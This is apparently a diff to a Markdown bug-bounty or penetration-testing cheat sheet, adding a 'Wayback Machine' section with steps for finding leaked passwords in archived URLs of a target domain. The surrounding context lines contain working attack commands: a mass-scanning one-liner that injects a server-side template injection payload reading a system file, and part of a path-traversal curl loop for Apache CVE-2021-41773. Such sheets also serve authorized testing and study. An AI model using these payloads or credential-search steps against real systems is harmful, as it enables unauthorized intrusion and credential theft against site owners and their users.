@@ -19,6 +19,7 @@
 - [Fingerprinting with Shodan and Nuclei](#fingerprinting-with-shodan-and-nuclei)
 - [Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)](#path-traversal-zero-day-in-apache-http-server-cve-2021-41773)
 - [Server-Side Template Injection (SSTI) at Scale](#server-side-template-injection-ssti-at-scale)
+- [Wayback Machine](#wayback-machine)
 - [Web Shell / Malicious Images](#web-shell-malicious-images)
 - [Wordpress Configuration Disclosure](#wordpress-configuration-disclosure)
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
@@ -298,6 +299,15 @@ $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure
 ```c
 $ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/hostname').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
 ```
+
+## Wayback Machine
+
+### Password Search
+
+1. Access https://web.archive.org/
+2. Type in the desired domain
+3. Switch to the URL tab https://web.archive.org/web/*/https://<DOMAIN>*
+4. Apply the filter `%40`
 
 ## Web Shell / Malicious Images
 
